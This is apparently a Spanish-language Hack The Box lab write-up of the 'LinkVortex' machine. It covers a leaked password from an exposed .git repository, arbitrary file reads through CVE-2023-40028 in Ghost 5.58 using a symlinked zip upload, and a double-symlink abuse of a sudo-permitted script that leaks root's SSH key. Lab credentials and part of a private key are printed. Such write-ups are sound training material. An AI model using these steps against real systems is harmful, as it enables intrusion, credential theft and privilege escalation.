---
tags:
  - type/writeup
  - env/linux
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/638
dificultad: Fácil
ip: 10.10.11.47
os: Linux
relacionados:
  - "[[Subdomain Enumeration]]"
  - "[[.git Exposure]]"
  - "[[Information Leakage]]"
  - "[[CVE-2023-40028]]"
  - "[[Ghost 5.58 Exploitation]]"
  - "[[Arbitrary File Read]]"
  - "[[Abusing Sudoers Privilege]]"
  - "[[Reading id_rsa]]"
  - "[[symlink atack]]"
---
# HackTheBox - LinkVortex

## Reconocimiento

### Escaneo de Puertos con Nmap

Para comenzar mi reconocimiento, lancé un escaneo de puertos estándar con `Nmap` contra la dirección IP de la máquina, `10.10.11.47`.
```Bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG logs/allports
nmap -sCV -p22 $(cat ip) -oN logs/linkvortex-sCV
```
Los resultados iniciales mostraron dos puertos abiertos:
- **Puerto 22/tcp:** `OpenSSH 8.9p1`.
- **Puerto 80/tcp:** `Apache httpd`.
    
El escaneo del puerto 80 me indicó una redirección a `http://linkvortex.htb/`, por lo que agregué este dominio a mi archivo `/etc/hosts` para poder resolverlo correctamente.
```Bash
echo "10.10.11.47 linkvortex.htb" | sudo tee -a /etc/hosts
```

Con el nombre de dominio configurado, volví a ejecutar `Nmap` para obtener información más detallada del servicio web.
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd
|_http-title: BitByBit Hardware
|_http-generator: Ghost 5.58
|_http-server-header: Apache
| http-robots.txt: 4 disallowed entries
|_/ghost/ /p/ /email/ /r/
```

Este segundo escaneo fue mucho más revelador. Confirmé que el sitio es un blog llamado "BitByBit Hardware" y, lo más importante, que está gestionado por el CMS **Ghost versión 5.58**. Además, el archivo `robots.txt` me reveló la ruta `/ghost/`, que al visitarla me presentó un panel de inicio de sesión para el CMS.

### Descubrimiento de Subdominios y Directorios

Para expandir mi superficie de ataque, decidí buscar subdominios utilizando `ffuf`.
```Bash
ffuf -w /usr/share/amass/wordlists/bitquark_subdomains_top100K.txt -H "Host: FUZZ.linkvortex.htb" -u http://linkvortex.htb/ -ic -fs 230
```
```
dev [Status: 200, Size: 2538, Words: 670, Lines: 116]
```

Encontré el subdominio `dev.linkvortex.htb`, así que lo añadí a mi archivo `/etc/hosts`.
```Bash
echo "10.10.11.47 dev.linkvortex.htb" | sudo tee -a /etc/hosts
```

Al visitar `http://dev.linkvortex.htb/`, me encontré con una página simple. Para investigar más a fondo, lancé otro escaneo de `ffuf`, esta vez en busca de directorios y archivos en este nuevo subdominio.
```Bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://dev.linkvortex.htb/FUZZ -ic -t 20
```
```
.git [Status: 301, Size: 239, Words: 14, Lines: 8]
```

El resultado fue inmediato: un directorio `.git` expuesto. Esta es una mala configuración de seguridad crítica que a menudo conduce a la exposición del código fuente y, potencialmente, de información sensible.


---

## Análisis de vulnerabilidades

### Exposición de Directorio .git

Un directorio `.git` expuesto en un servidor web me permite reconstruir todo el repositorio, incluyendo el historial de cambios. Utilicé la herramienta `git-dumper` para descargar el contenido del repositorio a mi máquina local.
```Bash
python3 git_dumper.py http://dev.linkvortex.htb gitdump
```

Una vez descargado, navegué al directorio `gitdump` y verifiqué el estado del repositorio.
```Bash
cd gitdump && git status
```
```
Not currently on any branch.
Changes to be committed:
  (use "git restore --staged <file>..." to unstage)
        modified:   ghost/core/test/regression/api/admin/authentication.test.js
```

`git status` me informó que había un archivo modificado: `authentication.test.js`. Para ver los cambios exactos, utilicé `git diff`.
```Bash
git restore --staged . && git diff
```
```diff
--- a/ghost/core/test/regression/api/admin/authentication.test.js
+++ b/ghost/core/test/regression/api/admin/authentication.test.js
@@ -53,7 +53,7 @@ describe('Authentication API', function () {
 it('complete setup', async function () {
 const email = 'test@example.com';
- const password = 'thisissupersafe';
+ const password = 'OctopiFociPilfer45';
 const requestMock = nock('https://api.github.com')
 .get('/repos/tryghost/dawn/zipball')
```

El `diff` reveló que una contraseña de prueba fue reemplazada por una nueva. En las publicaciones del blog principal, había notado que el autor era `admin@linkvortex.htb`. Con esta información, tenía un par de credenciales para probar en el panel de Ghost.

> [!warning] Credenciales Encontradas
> 
> - **Usuario:** `admin@linkvortex.htb`
>     
> - **Contraseña:** `OctopiFociPilfer45`
>     


---

## Explotación de vulnerabilidades

### Obteniendo Acceso Inicial (Foothold)

Utilicé las credenciales descubiertas en el portal de `/ghost` y obtuve acceso al panel de administración del CMS.

Dentro del panel, en la sección `Settings > About Ghost`, confirmé la versión del software: **Ghost 5.58.0**.

### Lectura Arbitraria de Archivos (CVE-2023-40028)

Una búsqueda rápida de vulnerabilidades para esta versión de Ghost me llevó a **CVE-2023-40028**, una vulnerabilidad de Lectura Arbitraria de Archivos ([[Arbitrary File Read]]) que afecta a usuarios autenticados.

La vulnerabilidad consiste en subir un archivo `.zip` que contenga un enlace simbólico (symlink). El sistema descomprime el archivo y, si se solicita el recurso a través de la URL correcta, el servidor seguirá el symlink y devolverá el contenido del archivo al que apunta.

Para explotarlo manualmente:

1. Creé la estructura de directorios que Ghost espera: `exploit/content/images/`.
2. Dentro, creé un symlink que apuntaba a `/etc/passwd`.    
    ```Bash
    mkdir -p exploit/content/images/
    ln -s /etc/passwd exploit/content/images/test-file.png
    ```
    
3. Comprimí el directorio. Es crucial usar el flag `-y` para que `zip` conserve el enlace simbólico en lugar de seguirlo y comprimir el archivo de destino.
    ```Bash
    zip -r -y exploit.zip exploit/
    ```
    
4. Subí el archivo `exploit.zip` a través de la opción `Settings > Labs > Import content`.
    

La importación fue exitosa. Para confirmar la explotación, solicité el archivo a través de `curl`.
```Bash
curl http://linkvortex.htb/content/images/test-file.png
```
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
node:x:1000:1000::/home/node:/bin/bash
```

Pude leer el contenido de `/etc/passwd`.

Para facilitar la lectura de otros archivos, utilicé un [PoC disponible en GitHub](https://www.google.com/search?q=https://github.com/AybarsGoker/CVE-2023-40028-POC). Tras modificar la URL de destino en el script a `http://linkvortex.htb`, lo ejecuté con las credenciales que ya tenía.
```Bash
chmod +x CVE-2023-40028.sh
./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
```

Mi objetivo era encontrar un archivo de configuración que pudiera contener más credenciales. Sabiendo que estaba dentro de un entorno Ghost, busqué la ruta del archivo de configuración de producción: `/var/lib/ghost/config.production.json`. Usando el shell interactivo del PoC, solicité este archivo.
```
file> /var/lib/ghost/config.production.json
```
```JSON
<...SNIP...>
"host": "linkvortex.htb",
"port": 587,
"auth": {
  "user": "bob@linkvortex.htb",
  "pass": "fibber-talented-worth"
}
<...SNIP...>
```

> [!success] Nuevas Credenciales Encontradas
> 
> - **Usuario:** `bob@linkvortex.htb`
>     
> - **Contraseña:** `fibber-talented-worth`
>     

Con estas nuevas credenciales, me conecté a la máquina a través de SSH y obtuve una shell como el usuario `bob`, capturando así la primera bandera.
```Bash
ssh bob@linkvortex.htb
```


---

## Escalada de privilegios

Una vez dentro como `bob`, mi primer paso fue verificar mis permisos con `sudo -l`.
```Bash
sudo -l
```
```
User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```

Descubrí que podía ejecutar el script `/opt/ghost/clean_symlink.sh` como `root` sin necesidad de contraseña, siempre que el argumento fuera un archivo con extensión `.png`.

### Análisis del Script y la Condición de Carrera (TOCTOU)

Revisé el código del script para entender su funcionamiento.
```Bash
cat /opt/ghost/clean_symlink.sh
```

El script realiza las siguientes acciones:
1. Verifica si el archivo proporcionado es un enlace simbólico (`test -L $LINK`).
2. Lee el destino del enlace (`readlink $LINK`).
3. **(Check)** Comprueba si el destino contiene las cadenas "etc" o "root". Si es así, considera que es malicioso y lo borra (`unlink $LINK`).
4. Si la comprobación anterior falla, mueve el enlace al directorio `/var/quarantined` (`mv $LINK $QUAR_DIR/`).
5. **(Use)** Si la variable de entorno `CHECK_CONTENT` está en `true`, imprime el contenido del archivo que acaba de mover a cuarentena (`cat $QUAR_DIR/$LINK_NAME`).

Aquí reside una vulnerabilidad clásica de **Condición de Carrera (Time-of-Check to Time-of-Use - TOCTOU)**. Hay un lapso de tiempo entre el momento en que el script comprueba el destino del enlace (`Check`) y el momento en que lee el contenido del archivo en su nueva ubicación (`Use`). Si puedo cambiar el destino del enlace simbólico en ese pequeño intervalo, puedo engañar al script para que lea un archivo sensible.

### Explotando con doble link simbolico

1. Crear un enlace simbólico inicial que apunte a la clave `ssh` que quiero obtener.
```bash
ln -sf /root/.ssh/id_rsa test.txt
```

2. Crear un segundo enlace simbólico que apunte a `test.txt` pero que pueda pasar la verificación, por ende tiene que terminar en `.png`.
```bash
ln -sf /home/bob/test.txt test.png
```

3. Por ultimo para que esto funcione tengo que establecer `CHECK_CONTENT=true`.
```Bash
CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh ./test.png
```
```
Link found [ ./test.png ] , moving it to quarantine
Content:
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
<...SNIP..>
xmo6eXMvU90HVbakUoRspYWISr51uVEvIDuNcZUJlseINXimZkrkD40QTMrYJc9slj9wkA
ICLgLxRR4sAx0AAAAPcm9vdEBsaW5rdm9ydGV4AQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

El script comprobó mi enlace, lo movió a `/var/quarantined/test.png`, y me devolvió el contenido de `/root/.ssh/id_rsa`.

Copié la clave a un archivo en mi máquina local, le di los permisos adecuados y la usé para conectarme como `root`.
```Bash
# En mi máquina local
chmod 600 root_key
ssh -i root_key root@linkvortex.htb
```

Con esto, obtuve acceso completo al sistema y capturé la bandera de `root`.


---

## Bandera(s)

> [!FLAG] `flag{user}`
> 9a7b06abf34bfdf25e7eb74bb309e676
^bandera

> [!FLAG] `flag{root}`
> a99f3a5e906271b5d7101cab9f7b60a1
^bandera